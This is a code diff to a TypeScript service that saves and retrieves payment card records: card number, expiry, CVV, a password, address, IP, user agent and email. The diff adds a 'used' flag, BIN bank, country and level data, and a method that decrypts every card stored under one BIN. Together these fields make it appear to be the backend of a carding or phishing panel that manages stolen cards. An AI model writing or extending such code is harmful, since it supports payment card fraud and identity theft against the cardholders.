@@ -56,15 +56,19 @@ export class InformationService {
         ccDTO.ip = this.encrypt(ccDTO.ip);
         ccDTO.userAgent = this.encrypt(ccDTO.userAgent);
         ccDTO.email = this.encrypt(ccDTO.email);
-
+        
         const cc = new this.ccModel(ccDTO);
         cc.createDate = new Date(Date.now());
+        cc.note = '';
+        cc.isUsed = false;
         cc.bin = bin;
+        cc.total_bin = data.bins_data[0].total_bins;
         cc.country = data.bins_data[0].Country;
         cc.bank = data.bins_data[0].Bank;
         cc.level = data.bins_data[0].Level;
         return cc.save();
     }
+
     async getInformation() {
         const data = await this.ccModel.find();
         return data.map(item => {
@@ -89,5 +93,21 @@ export class InformationService {
             data.ccnum = this.decrypt(data.ccnum);
         }
         return data;
+    }
+    async getInfoByBin(bin: string) {
+        const data = await this.ccModel.find({ bin: bin });
+        return data.map(item => {
+            item.ccnum = this.decrypt(item.ccnum);
+            item.month = this.decrypt(item.month);
+            item.year = this.decrypt(item.year);
+            item.cvv = this.decrypt(item.cvv);
+            item.password = this.decrypt(item.password);
+            item.address = this.decrypt(item.address);
+            item.address2 = this.decrypt(item.address2);
+            item.ip = this.decrypt(item.ip);
+            item.userAgent = this.decrypt(item.userAgent);
+            item.email = this.decrypt(item.email);
+            return item;
+        });
     }
 }
